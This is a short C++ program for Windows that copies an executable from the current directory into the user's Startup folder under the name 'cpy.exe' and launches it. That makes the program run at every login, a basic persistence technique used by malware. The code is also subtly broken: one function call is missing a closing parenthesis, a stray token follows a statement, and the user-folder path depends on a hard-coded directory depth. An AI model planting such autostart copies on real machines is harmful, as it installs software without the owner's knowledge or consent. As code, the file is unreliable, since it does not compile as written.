#include "windows.h"
#include "stdio.h"
#include "unistd.h"
#include "iostream"
#include "string.h"

using namespace std;
int main(){
    char path[150] = "", files[100] = "", newpath[150] = "", newfile[150] = "";
    getcwd(path, sizeof(path)); //get current directory//(unistd.h)
    strcat(path, "\\sayhello.exe"); //add file name after directory//(string.h)
    strcpy(files, path); //copy path value into files//(string.h)
    char* test;
    test = strtok(path, "\\"); //split current directory//(string.h)
    for(int i=0; i<3; i++){ 
        strcat(newpath, test);//copy splitted value into newpath//(string.h)
        strcat(newpath, "\\");//add \ into new path//(string.h)
        test = strtok(NULL, "\\");//get splitted value after //(string.h)
    }
    strcat(newpath, "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"); //add startup directory after user path//(string.h)
    strcpy(newfile, newpath); (string.h)
    strcat(newfile, "\\cpy.exe"); //new file in startup directory//(string.h)
    cout << files << endl;
    cout << newfile << endl;
    CopyFile(files, newfile, true; //copy file into startup file//(windows.h)
    SetCurrentDirectory(newpath); //cd to startup directory//
    system("start cpy.exe "); //run that file//
    return 0;
}

